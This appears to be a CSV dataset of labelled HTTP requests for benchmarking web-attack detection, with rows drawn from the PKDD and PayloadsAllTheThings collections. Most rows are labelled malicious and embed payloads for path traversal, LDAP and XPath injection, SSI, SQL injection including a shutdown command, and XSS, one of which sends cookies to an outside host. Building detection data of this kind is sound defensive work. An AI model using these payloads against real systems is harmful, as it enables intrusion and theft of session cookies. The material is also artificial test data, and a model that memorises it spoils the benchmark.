attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
,hard,-2.0,benign,"POST /tgVkRa/ctetoecfpiH0E3aaSb/dHJDVLR.@.86Y3HFOwso/fE6zE0/zeTtxers/LnetcatUIKTvarQ/mSwRCB.jlKVupasswdy8/wget6rXvVMt/rhmHunhuhE.html? HTTP/1.0
Content-Length: 217
Content-Language: tktcytWo,ie,6
Content-Encoding: gzip
Content-Location: /l0ehh/Hdt6Io/epdsoll/runi.css
Content-MD5: ZzRldEFhaGcwZG9kbnBpdA==
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 05 Aug 06 01:17:53 GMT
Last-Modified: Wed, 22 Dec 04 17:40:09 GMT
Host: 251.14.28.123
Connection: close
Accept: */*
Accept-Charset: *
Accept-Encoding: deflate;q=0.2, identity;q=0.5, identity
Accept-Language: Hajnth0n-tr, tfkan-terup2i;q=0.8, don-chEta, pt-ts8h3pl;q=0.5, 32auvA-hfs6tcsD;q=0.6
Cache-Control: max-stale
Client-ip: 39.222.108.79
Cookie: I.likeG3SeXr=0;eoaeAi=tdflvzk.Mx;Tnaew4lsts=7 Adlrifoh
Cookie2: $Version=""3""
Date: Sun, 11 Sep 05 13:27:56 UTC
ETag: ""FyD9jloh6p4Fowm9S""
Expect: 100-continue
From: ghtahOkt@redNeaN.biz
If-Modified-Since: Thu, 04 Nov 04 13:32:13 CET
If-Unmodified-Since: Thu, 06 Sep 07 24:48:25 GMT
If-Match: *
If-None-Match: ""aKcds.CqvKNQW3s""
If-Range: Sat, 07 Feb 04 12:43:48 CET
Max-Forwards: 4
MIME-Version: 4.1
Pragma: no-cache
Proxy-Authorization: Digest qop=auth
Authorization: Basic eTV0czM6dGR0c2I=
Range: 32908-897936,302-48186
Referer: /nGeaeelO/ueliax.js
TE: trailers,deflate
Trailer: Referer
User-Agent: Mozilla/1.0 (Windows; U; Win98 7.6; 9t-en; rv:9.8.5) Gecko/58473683
UA-CPU: 68000
UA-Disp: 381,9388,32
UA-OS: Win95
UA-Color: color8
UA-Pixels: 179x0676
Via: 4.5 204.121.57.147:2, FTP/6.9 www.ureand.tiff
Transfer-Encoding: deflate
Upgrade: qdoi/7.1, etiX/1.2, Sor/4.3, ex2/0.1
Warning: 920 www.wreat0oe.html ""tenate7sct"" 
X-Forwarded-For: 224.40.113.11
X-Serial-Number: 124878
----: ---------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~

Rto=400217&fn=Pci5isa&MohsmaiRphoi=7&hPfdwaOhou0C=ss t&hEPCZL=Eshutdown]optm&lrcstconetn=efyG&Notmseev2ieae=nonCdseh8raalc7hn&A3cttrxaeysn4=9865382&bVg=09110355&id9Rn_r=99389292&Uea9RnglCte8Ue=1&meAelato1eev3e7=n:",6097,2044,xml_test-6097,pkdd,
Path Traversal,medium,4.0,malicious,"GET /error/\..\..\..\..\winnt\win.ini? HTTP/1.0
Host: 0.101.198.241:80
Connection: close
Accept: application/rtf, text/html;q=0.9, audio/basic
Accept-Charset: *;q=0.9
Accept-Encoding: *
Accept-Language: a-p9vlhr;q=0.6, mCmh-uaonk4
Cache-Control: no-cache
Client-ip: 229.13.49.114
Cookie: sedtph=3
Cookie2: $Version=""8""
Date: Sun, 18 Feb 07 16:24:22 UTC
ETag: ""NeIswK_7a5EBHO2LNI""
Expect: eLdfnttl
From: hlsgr2q@lokeQ.ch
If-Modified-Since: Sun, 21 Mar 04 21:14:23 UTC
If-Unmodified-Since: Tue, 18 Mar 08 17:40:36 UTC
If-Match: ""@qTsqfeb1mDFCco""
If-None-Match: ""UTO0q3VBxUsrOf0.""
If-Range: ""s@O51GsxN2Uie9S""
Max-Forwards: 2
MIME-Version: 6.7
Pragma: no-cache
Proxy-Authorization: NTLM TmhTZWRhdGhvaW9vZWlvc1dzenRmc2hhZDB1ZG5zcmFYZGQyc3Juc25uOA==
Authorization: Basic T2UzdHNiZUw6ZXN2NnVT
Range: -3,456-488022
Referer: http://www.p8ie3r.gov/h4aahb/ahlhsya.avi
TE: gzip;q=0.6,trailers
Trailer: Max-Forwards
User-Agent: Mozilla/8.9 (compatible; MSIE 3.6; Linux i586; oboIrgcpU)
UA-CPU: StrongARM
UA-Disp: 4629,539,8
UA-OS: Win98
UA-Color: color8
UA-Pixels: 213x015
Via: 2.0 91.186.196.32
Transfer-Encoding: gzip
Upgrade: ud4hrt/2.8, ifephn/3.0, adtIIr/9.5, oHsuT3/8.9
Warning: 131 165.136.34.196 ""tchbajdsaa"" ""Fri, 12 Mar 10 18:52:44 CET""
X-Forwarded-For: 101.164.70.181
X-Serial-Number: 888948293
----: ----------------
~~~~~: ~~~~~~~~~~~",45100,1376,xml_test-45100,pkdd,
LDAP Injection,medium,4.0,malicious,"PUT /aA5wrUF3mfwG/eCpauj8cfRQM2/Eiheqyhtepnzadue/s-Z2m/e_u0QM@QROMNPVSin/oD6GTJKNE3rjMBIHQEz/Sxp_/4eoymsri4xdgkgna.tiff? HTTP/1.0
Content-Length: 263
Content-Language: i,irePh,hF2EN1h
Content-Encoding: identity
Content-Location: /n5sBrg/8ulEie/dsq9eo.txt
Content-MD5: ck5laTBhaGhlaWo2U2VybA==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 28 Jun 06 18:44:39 UTC
Last-Modified: Mon, 14 Mar 05 01:48:46 GMT
Host: 200.188.164.221:80
Connection: close
Accept: text/xml
Accept-Charset: x-mac-greek, windows-1253;q=0.1, x-mac-cyrillic, cp-936
Accept-Encoding: *;q=0.4
Accept-Language: *
Cache-Control: only-if-cached
Client-ip: 223.45.213.191
Cookie: Idehyts2lotdo=3acceptszadminttc5Vr6@nxterm;ie2ogogslnotwe=ed5Nes>mnT6oMhrni ;s1rv=90631;ceomjpvaec=) (|    (displayName=had*)    (name =  had*)( mail=had*   );oMclzetoaet1un=wgoE0.-GsDt;dgd=uthelowusstxolsunv
Cookie2: $Version=""8""
Date: Wed, 28 Dec 05 23:23:56 GMT
Expect: 100-continue
From: moUa@aWtec.biz
If-Modified-Since: Wed, 10 Jun 09 07:26:20 CET
If-Unmodified-Since: Wed, 28 Jan 04 14:28:35 GMT
If-Match: ""VXKuOh3uxLnZ1Elp9""
If-None-Match: *
If-Range: Tue, 31 Mar 09 07:33:47 UTC
Max-Forwards: 4189
MIME-Version: 2.7
Pragma: no-cache
Proxy-Authorization: eFDr4 tnpehf=6liout
Authorization: eridEi EimEu=aomgami
Range: 648-
Referer: /eb9tw/sbyeor/aattStt.gz
TE: trailers
Trailer: Date
User-Agent: enfiuiahY (oMd4@dRK; r2FGf9UtI; 9PjxzYO)
UA-CPU: Sparc
UA-Color: color32
UA-Pixels: 7722x806
Via: HTTP/6.2 154.147.244.76, 9.6 2.114.137.195, 6.0 www.ei9rh.gif
Transfer-Encoding: gzip
Upgrade: qh5sne/2.6, 4nbgo/3.9, dnda/5.1
Warning: 215 www.tH6orimn.htm:412 ""ec8l"" ""Sat, 30 Jan 10 05:43:13 CET""
X-Forwarded-For: 37.38.5.148
X-Serial-Number: 733492432548520
----: -------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

dr=%u&oPgeeqytaRewr1=zise&Nts=22271229&Q@5K=sitrnlaecea&tezs=ch3gaPls&aerHasd9wcQg=oy&tAaaeH=813110&otanooodn=|r?Dmi-sock_stream2+&vetlr0Ohsua= f&azoh5z2bir=s8Dj8IEARtlt&or=a_B&eAyuDE@samapX=35&lsec=u3nt drhnuete&trshaB7aord=l2wheree)cgeueea%p:4trh0",39114,2093,xml_test-39114,pkdd,
,hard,-2.0,benign,"POST /nJS8olLWwe2hewTwj9cX/RMcht1/Jroeu2mnt7d/dTiyE@xt/PhLidrcAnK-etcy/pKz4n0mwhazUam/Etlntha/yUuiVIwIv@wRb6I.aspx? HTTP/1.1
Content-Length: 147
Content-Language: ln,o8Rire
Content-Encoding: gzip
Content-Location: http://www.osmtt.uk/grorf/6r8tqg/eon4/tune/0ahweays.cfm
Content-MD5: YmVlTGN4clNlb2xuczR0bg==
Content-Type: application/x-www-form-urlencoded
Expires: Sun, 06 Jan 08 19:20:58 UTC
Last-Modified: Mon, 01 Mar 04 01:55:09 CET
Host: 64.71.163.157
Connection: keep-alive
Accept: video/*;q=0.9, application/*
Accept-Charset: *
Accept-Encoding: *;q=0.1
Accept-Language: *
Cache-Control: no-store
Client-ip: 116.18.167.222
Cookie: S6DubnWmD1=95094;eXice=093816848
Cookie2: $Version=""8""
Date: Tue, 30 Mar 10 23:07:21 CET
ETag: W/""GL@LsclmgUamZEDsv_""
Expect: 100-continue
From: 8Tmtnybi@toleu.gov
If-Modified-Since: Fri, 25 Mar 05 12:08:25 CET
If-Unmodified-Since: Fri, 06 May 05 20:02:22 UTC
If-Match: ""rSar2JP0uH0-L_Ma""
If-None-Match: *
If-Range: Tue, 09 Feb 10 08:51:01 GMT
Max-Forwards: 5952
MIME-Version: 5.0
Pragma: muna='s'
Proxy-Authorization: NTLM aU9yd2hldW1uZ3RycnFtdUhqZUE0b3U5cmVzdGJyc3RhZTFnYWk1bnZveWVMbQ==
Authorization: NTLM dDBvaXV0aWVlYTNjYW5hQW16ZWFiZUdwYW9sZGVic2xtaGI3M2l6ZWF1
Range: -92864
Referer: /Rt0hE4p/an9g0/sdmn/vn3ria.bin
TE: gzip;q=0.3,deflate,deflate;q=0.9
Trailer: TE
User-Agent: tooeqnsfc4etea
UA-CPU: Sparc
UA-Disp: 3186,9762,16
UA-OS: WinNT
UA-Color: color16
UA-Pixels: 9714x0556
Via: 3.1 48.196.153.63, 6.9 59.222.233.126, 1.8 173.143.52.61:7739
Transfer-Encoding: gzip
Upgrade: lOrae/2.3, unerfn/4.1, roft/4.9
Warning: 720 www.Aeesaq.jpg ""emdinlt5scc"" ""Tue, 21 Sep 04 09:33:30 CET""
X-Forwarded-For: 143.200.9.7
X-Serial-Number: 57690312658
----: ------------------------------------
~~~~~: ~~~~~~~~~~~~~

yensIiaY=993&oelfcle02ia3iTe=11527253&EHRPisn=829564&h2seTszyNEan=/httpwp-abiframe3ahdeleter$c&BUMmwGhv=tzb&yrMCapdbaOguh8=Yeih&8mZTtesue=t2de2",34333,1942,xml_test-34333,pkdd,
SSI,medium,4.5,malicious,"GET /ar/iiuuaraiike/ulieelh/anoqssnarhtOIllg/yunsRtnbp/Thttpf78cQKYO/eDLKLRvpYIngZ6Ikfkek/1bpehBataHuzzu9ia/ibonriegeic8nLss8c/bC2exH.pFWrfGW/fkpaZd7yGCgd9a8KBaJh/Ralnwhshl8a9cywo.js?MHl.5OuxZRF=62&cHe41ln5bdt=iaw%40GN4ZecGw&stwesbdnikhaP=+stwOis8muasohts%3AE9&rae9aHenhbueaq=yxp_ot%28DcEinnt%5CNEpositionp%3Btmps&n9a3arnpOarr=hgraphdreideu&Fos2o5aWlyytade=zLfcsPl0&9r=4ryC&tseHe=rimdhHrd&6nc=fTniwse%3Fepzt&Ttfntllpcost6=ddsnedh%3E&inGvc=h1&sxdtbroe3F=UAoosrksoqkt HTTP/1.0
Host: www.iig6.cz
Connection: close
Accept: application/postscript, application/x-tar;q=0.3
Accept-Encoding: *
Accept-Language: *;q=0.7
Cache-Control: no-store
Cookie: @meta2xb-=<!--    #include  virtual=""d:\windows\autoexec.bat""  -->;SS=kro;cpErlee5ek=kmindtD;atm=pEedesetcr;co=hr=deleteu
Date: Tue, 01 Sep 09 10:06:32 CET
If-Unmodified-Since: Sun, 20 Sep 09 20:46:16 UTC
If-None-Match: *
MIME-Version: 2.6
Proxy-Authorization: Basic aGlsdDp0ZGxtZg==
Referer: /sWcIsxnc/pvIaeh.gif
User-Agent: ocao3ep/3.2.5",40388,996,xml_test-40388,pkdd,
XPath Injection,medium,4.5,malicious,"PUT /iQ.Vfghk@z/L96.vhttpW4L/iY3OGpD6TccXbg-eSflm/aSxZder3ZK/eoKdrfqjSmliQr8QIjK1/e_TxqYEX9Sq0@THkKlyd/h9lkSSoZbl6VSJYzZ/k9d9G.m2BtsM9v6pdNc8/e.gfcDEa/ocvI.css? HTTP/1.0
Content-Length: 6
Content-Language: tcheE,bore6m
Content-Encoding: identity
Content-Location: http://www.deso.be/avgo/tliEe/ii4zhti/prt1o8.bin
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 16 Aug 04 16:41:46 UTC
Host: 190.91.81.232:80
Connection: keep-alive
Accept: image/gif;q=0.9, image/*;q=0.8, video/mpeg;q=0.3
Accept-Charset: *
Accept-Encoding: 
Accept-Language: OeoYl'] |     P    | //user[   name/text(  )=  'yw
Client-ip: 179.211.249.175
Cookie: o7ELtoseaay=434979;bM5pfap08input=154806418;nSmd=4619427218
Date: Tue, 06 Dec 05 02:06:57 CET
Expect: pxoth4g=asopr;epfslshe=zeyw
If-None-Match: *
Max-Forwards: 2495
Pragma: no-cache
Authorization: NTLM bm1oYXVXY2U0b29kYnh1YXhndDYyZW1ncHRuYWFvZzRuZHRlbQ==
Referer: /ee5at/lri0b.html
TE: chunked;q=0.5
User-Agent: bDqrvO http://www.pnn1dalo.it
Via: 9.1 8.23.82.234
Warning: 797 www.hahtsh.htm ""a6t6tidmteLue8EsDt"" 

.R3Q=t",50043,1088,xml_test-50043,pkdd,
LDAP Injection,medium,,malicious,"POST /api/items HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Connection: close

search=user = *)(uid=*))(|(uid=*&id=1222",,199,patt-ldap-injection-0222,PayloadsAllTheThings,user = *)(uid=*))(|(uid=*
XSS,medium,4.5,malicious,"PUT /pDperlinputK@ORLQQv/stmpacceptjtp/qKsDQ5qq3U_QR/ld/m6xQ5bUP7PHK/Eueci2s/sI/U6ayvuz_0aOg_9ftp/oYs5/lrt6.cfm? HTTP/1.0
Content-Length: 238
Content-Language: t0ap0jk,eile6a,fxisra
Content-Encoding: compress
Content-Location: /ymdrH/sjlre/oiOomhs/aprrho1c.asp
Content-MD5: RHNhZm84dnNvNmRpNnQwVA==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 03 Jan 08 23:20:40 GMT
Last-Modified: Thu, 01 Nov 07 04:37:29 UTC
Host: 252.107.254.113
Connection: rufh
Accept: */*
Accept-Charset: *
Accept-Encoding: deflate, compress;q=0.0
Accept-Language: <input    type   =    ""  image     ""   dynsrc= ""   javascript:  [document.location.replace    ('http://www.raisde.com/cgi-bin/tireetmaie.cgi'+document.cookie);]    ""   >
Cache-Control: max-stale
Client-ip: 188.123.167.43
Cookie: eiWlvtC0ksap=hn9weeaoeKddawt;ynniDkndMaorncs=l6NU;sneslenEaeiiO=includeiy;eeqAewha3eE8f= b5sju9/Hors7e Ed ;raeSpeiEeea=31579785
Cookie2: $Version=""5""
Date: Tue, 22 Aug 06 21:39:51 GMT
ETag: W/""JkNm7sD6l4qVMEyYQ5ri""
Expect: iQbird
From: kTOsae7a@Lnatniube.cz
If-Modified-Since: Mon, 19 Jun 06 14:03:12 UTC
If-Unmodified-Since: Thu, 08 May 08 08:23:42 CET
If-Match: *
If-None-Match: ""-JeeQkIneJBvcnuG_j""
If-Range: Sat, 17 May 08 17:05:07 CET
Max-Forwards: 88
MIME-Version: 6.3
Pragma: esSm=eltioIo
Proxy-Authorization: Digest cnonce=""ccntio""
Authorization: Digest realm
Range: 9-78819
Referer: http://www.noeinid.gov/gMtE/6oa6/iEshw/daElos/6oysii9.php4
TE: trailers,deflate;q=0.3,trailers
Trailer: If-Unmodified-Since
User-Agent: tnebl/1.5.7.2
UA-Disp: 5215,325,8
UA-Color: color32
UA-Pixels: 2557x0166
Via: FTP/1.1 www.erws.js, 1.9 www.lybsdere.htm, 3.8 www.duszjamh.html
Transfer-Encoding: identity
Warning: 893 78.20.40.155 ""h9rlthiE7eebet5grc"" 
X-Forwarded-For: 16.22.84.83
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

BlxBH=ftp8a@ft%A4\%e]d&J9echoW-1B3eloghaving=31452292&ee=6719277&hkIEscriptz=1226113&Zrchild@E7UO=ctldett1zel&hlhgyrnestoi=;itsprocessing-instruction&Tltshsst=m&raoashmttrcmh=400520&y1NWG2optfnEm=sbviaYeT&boot.iniQmail_=h wp-o",48209,2073,xml_test-48209,pkdd,
XPath Injection,medium,4.0,malicious,"GET /nN/37/iQTouYWvC1/onii/dpittu/opv@_wDVn-/nGAwqmd38S/D6o03I.aY9rnUf/dqVRdFMz@3lfe.png? HTTP/1.1
Host: www.ee7a7.it
Connection: aDT8to
Accept: */*;q=0.1
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *;q=0.5
Cache-Control: max-stale=44
Client-ip: 59.239.90.47
Cookie: ttiia=n6t 1asi
Cookie2: $Version=""6""
Date: Thu, 11 Mar 10 01:25:03 GMT
ETag: ""dFInZO7AAV.iTnAMyce""
Expect: 100-continue
From: djepela@Ereu.st
If-Modified-Since: Fri, 26 Jun 09 06:45:48 CET
If-Unmodified-Since: Thu, 03 Mar 05 15:59:10 UTC
If-Match: ""OKAsHDeFY4@.W@Zy""
If-None-Match: "".dgSZX4FqE7N2XCKf""
If-Range: Sun, 28 Mar 04 04:42:40 UTC
Max-Forwards: 9
MIME-Version: 9.6
Pragma: sifA='92ie'
Proxy-Authorization: aisd RhjLhrht=aojbCnu
Authorization: Basic ODkzbW5hdDpldnFzYWM=
Range: -3871,41-303,8-768822
Referer: /sOdsvi.rar
TE: trailers,trailers,trailers
Trailer: If-Range
User-Agent: teeatln'  or   1<     ioieet/t/9ir/child::text()[position()=85]  or    'ljnkade'  =    '
UA-CPU: StrongARM
UA-Disp: 8678,966,8
Via: 1.8 www.sestsrgn.css, 9.1 143.209.36.110
Transfer-Encoding: compress
Warning: 084 www.rse4aa.htm ""nhtTetlnisasnnesic"" ""Thu, 10 May 07 21:23:05 UTC""
X-Forwarded-For: 121.242.149.148",35471,1213,xml_test-35471,pkdd,
XSS,medium,3.5,malicious,"POST /G9GJ/eD1/hHKh1pDvtXx2/p-7BORcf7/eRHKRJBe/jvWstwhH.b@egRtdcU/tN-pNnWMfGY..neu6/nVncsCEYP/lCD/n@IuVqQ6XI1@-/ebwxpointwqtsniEf6.jpeg? HTTP/1.1
Content-Length: 25
Content-Language: o,ciS,dfse
Content-Encoding: gzip
Content-Location: http://www.sniuRae.gov/lemq5tp.gif
Content-MD5: eXR5N3RsdGdzc3ZlbGF0MQ==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 26 Mar 10 22:14:55 UTC
Host: www.insrh.ch
Connection: keep-alive
Accept: image/jpeg, application/postscript;q=0.4
Accept-Charset: iso-2022-jp;q=0.6, us-ascii;q=0.7, iso-2022-kr;q=0.7
Accept-Encoding: *;q=0.6
Accept-Language: ma-i
Cache-Control: no-transform
Client-ip: 57.43.224.250
Cookie: Tdlepb=<bgsound     src=   "" javascript:[alert   ('35tD');]  "">;qcs=3919411;ni=iee lrahw0kes48ns[lr
Cookie2: $Version=""835""
Date: Fri, 20 Apr 07 21:11:40 CET
ETag: ""NetEC123WaRpbFC""
Expect: hvrc
If-Modified-Since: Mon, 15 Sep 08 19:25:13 UTC
If-Unmodified-Since: Tue, 23 Jan 07 03:03:05 UTC
If-Match: ""xsLl28bB-G1vw7fZ""
If-None-Match: ""82@7vHckmTc37EskIkX""
If-Range: ""wMIQJgM7OCNp-9hQw""
Max-Forwards: 612
MIME-Version: 5.4
Pragma: no-cache
Proxy-Authorization: NTLM ZFRhaXJlbzVlZHVldG5sZmxlbXVhaTgzMXV0cmhjbnNhM3Q=
Authorization: Basic U3NhbTpqbm9t
Range: 356-3
Referer: http://emlm.com/iddxdr/yae1/opwmeee/boeoep/o08ct.mdb
TE: deflate,deflate;q=0.8,trailers
User-Agent: lhtas52kinea4Ge
UA-OS: Windows 98
Transfer-Encoding: compress
Upgrade: a8iead/9.4
----: ------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

fDdY2sB.h=Df8iehs5oaobRtE",48284,1565,xml_test-48284,pkdd,
SQLi,medium,3.0,malicious,"GET /efDcj/eA0ygVI/2nolc/DJW7Evo/sisacowh/i0k6/tNsyttik/iaubxoe6seuii/en2dtdn/9Niftoocamd2dharh/rVotoxrenmM0yraMz/ondddhswie.png?7bsEcsdi=pa&aepruh=oihzot%27-5+tdrljt6%3E&IQWalsdmochaV=e+ol0&AVf4=lqs&eImeecgLsiteahv=tVUL&cl=hX.3I&wlfiaen=036970&ous=01hzgh&oGep9=%27select+++++customer_phone++%27%7C%7C%27from+customers+++++%27%7C%7C%27where+++customer_surname%3D%27%27%27%7C%7C+++++lv_surname%7C%7C%27%27%27++++and++customer_type%3D1%27%3B HTTP/1.1
Host: 198.97.89.74
Connection: a6hmaap
Accept: video/quicktime;q=0.9, text/xml, text/html;q=0.9
Accept-Charset: x-mac-greek;q=0.9, koi8;q=0.0, cp-932, euc-tw;q=0.0, windows-1257;q=0.0
Accept-Encoding: *
Accept-Language: *
Cache-Control: no-cache
Client-ip: 94.165.178.34
Cookie: odshhisdio5=5xlQqQ;snz=zohprlmgehh;;Sa2acds8dtlotsb=satmys;8fwem=mb7eEi4dtbduQpfeti;ft5dltprg1adA=ts;sbpgxtllwtfcd=ehmyye ynswemg 0-r
Cookie2: $Version=""134""
Date: Tue, 31 Aug 04 17:54:57 UTC
ETag: ""R5X6Mr66Uc_-mrSq2""
Expect: 100-continue
From: 8eae@aimsslc7.net
If-Modified-Since: Sat, 01 May 10 14:27:56 CET
If-Unmodified-Since: Sun, 31 Jul 05 24:20:45 GMT
If-Match: ""TIvclBse10CwPioieO""
If-None-Match: ""kvNQXDDH7cBkIqEjNv""
If-Range: ""6kNai0wxdgBmfbZ""
Max-Forwards: 904
MIME-Version: 2.3
Pragma: no-cache
Proxy-Authorization: NTLM ZWVlT2luN25CbmdyZmFla3JsbDF0YXkzZ3Rpa2xmbW4=
Authorization: ojo1 2ea21rtw=lubthm
Range: 882861-05
Referer: /fvhn/rmreuat/3Edga/mW8edt/rloE.tar
TE: gzip
Trailer: Upgrade
User-Agent: ejua/2.4.8.4.3
UA-CPU: Sparc
UA-Disp: 8058,0040,16
UA-OS: Windows 95
UA-Color: color8
UA-Pixels: 323x892
Via: HTTP/4.9 www.t7IsaWuQ.html, 0.3 www.dta9.tiff
Transfer-Encoding: gzip
Upgrade: egf/1.1, bses/7.3
Warning: 767 136.91.228.117 ""ogadceLeitGounodog"" 
X-Forwarded-For: 27.160.160.90
X-Serial-Number: 280200406213
----: -------------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~",42285,1893,xml_test-42285,pkdd,
SQLi,medium,3.0,malicious,"POST /Re/lGTQD.Ba50VKhGV.2SM/5Ccat/2rsrefgiTtpzkaxy/h7gZpw_ca.WdZQ/sKtB2r9passthruKWQ-rso/1YtVuAv3tb9kI/m5lnnbiulr2we9Rcgo/sjS/04tQTH.dll? HTTP/1.0
Content-Length: 201
Content-Language: ito4epr
Content-Encoding: gzip
Content-Location: http://www.rhsyo.ch/4dTae.aspx
Content-MD5: ajNmcjB0YXNtZTZzNGJqZA==
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 24 Oct 09 06:14:06 CET
Last-Modified: Fri, 11 Nov 05 18:44:37 GMT
Host: 193.53.121.112
Connection: close
Accept: video/*;q=0.6
Accept-Charset: iso-8859-6;q=0.9, cp-932, x-mac-icelandic
Accept-Encoding: *
Accept-Language: *
Cache-Control: no-transform
Client-ip: 48.186.187.130
Cookie: eerbeergeneuwwr=jgmPKc9c@;czaenu2skmedri=;   EXEC(    'INS'+'ERT     INTO  users   values(6,'Aiet1Ro1n','to'    ));ketacthmlb=8236636;oNiocaear0ynsa=~Qsock_stream
Cookie2: $Version=""74""
Date: Wed, 26 Jul 06 02:55:06 GMT
ETag: ""WF4A4@FXbzWEO3h-""
Expect: dpiit9td
If-Modified-Since: Sat, 21 Feb 09 02:57:22 CET
If-Unmodified-Since: Tue, 07 Dec 04 05:29:38 UTC
If-Match: *
If-None-Match: ""K-IU9GQHmG9Mlwrf""
If-Range: ""zuMpsrhycN9KwOzR9r32""
Max-Forwards: 0
MIME-Version: 5.1
Pragma: aix0wrs='d4Ii'
Proxy-Authorization: 1oi2hy rTepl=hneaC
Authorization: Basic a3RzbTpzN2V5bQ==
Range: 169067-0
Referer: /hfsjathl/aejy.aspx
TE: trailers,chunked;q=0.2
Trailer: Authorization
User-Agent: Mozilla/6.8 (Windows; U; WinNT 4.1; Ak-he; rv:7.8.6) Gecko/68465599
UA-CPU: PowerPC
UA-OS: FreeBSD
Via: 5.0 www.c9hhu.tiff, 9.2 53.121.42.217, 8.5 134.106.105.31
Transfer-Encoding: gzip
X-Serial-Number: 58260161
----: ----------------------------

plegh=stws/ lriframeM-38s7 ar&RhriyhttpphpGP=t&ofb=ennqiio2&PFXCT4zI=sgieii0&3cusrGiCpW14Vj=8645946&saeof9SiHerd=jnCcHnull>&fcog8oqsrar=214342&equutssfs3Z=s&YperlACMHutmJFZ=| 2&Cil0tawTw@=meWxttA",42772,1817,xml_test-42772,pkdd,
SQLi,medium,3.0,malicious,"GET /irtiilabqtbooabj/rZqFR_hWz@vg/awxPhs6gHq/1lKpdFq/paiihiii/adleapntu6strtArt8/wheredocumenti0optmnwhereHiLKL/xhonhol8ua87/tPQ0ORUcHjxa/tarwrrHthceFeqsMft/bhp7h2i/5gmRlasgbS.jpg?anoGjeicqd=948127&hiulsuolbr2r5xi=2930&tfoetEbttlN=aheoth6cghaving&@1fQn=%27%3B+shutdown--&r1t=re%28autoexecOvnp+m&qglprt=080&mhfe6qb7=likec&i1ndoedre7=408151&aolbtgpt=obe+u3e HTTP/1.0
Host: 32.16.37.141
Connection: fhnee
Accept: image/jpeg;q=0.4, image/jpeg, application/x-tar
Accept-Charset: windows-1250, x-mac-arabic;q=0.1, iso-8859-2
Accept-Encoding: 
Accept-Language: *
Cache-Control: no-transform
Client-ip: 41.133.176.17
Cookie: nisd8enca=pcrl;yth3hn1maee=vre
Cookie2: $Version=""316""
Date: Sat, 24 Apr 04 10:47:49 GMT
ETag: ""H-wtGNRWTakDfVw7""
Expect: taus=aiyn
From: Iyirabt@mar7tEeeb7.de
If-Modified-Since: Mon, 24 Nov 08 05:30:00 GMT
If-Unmodified-Since: Tue, 13 Jan 04 06:18:48 GMT
If-Match: *
If-None-Match: ""vwge@FysRj3zYHz""
If-Range: Sat, 25 Sep 04 13:40:58 GMT
Max-Forwards: 389
MIME-Version: 0.8
Pragma: otniwcif='n7l'
Proxy-Authorization: Digest uri=http://Ih9gc.net/soss.txt
Authorization: Basic ZWE0aHo6cm44ZmllMXY=
Range: -221064
Referer: /4tocr/edtsaee/pr33qex/lnh7mo3.tar
TE: gzip,trailers,trailers
Trailer: Accept-Charset
User-Agent: Mozilla/1.3 (X11; U; Unix 2.6; lo-4e; rv:2.5.1) Gecko/81235409
UA-CPU: Sparc
UA-Disp: 4298,556,32
UA-OS: FreeBSD
UA-Color: color32
UA-Pixels: 8709x899
Via: 6ucKLt/1.7 www.betno.jpeg, FTP/6.9 219.111.145.75
Transfer-Encoding: gzip
Upgrade: tsem/9.8, icrMn/2.4
Warning: 119 141.109.167.27 ""sebrw"" 
X-Forwarded-For: 88.3.128.18
X-Serial-Number: 772384141
----: ----------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41981,1723,xml_test-41981,pkdd,
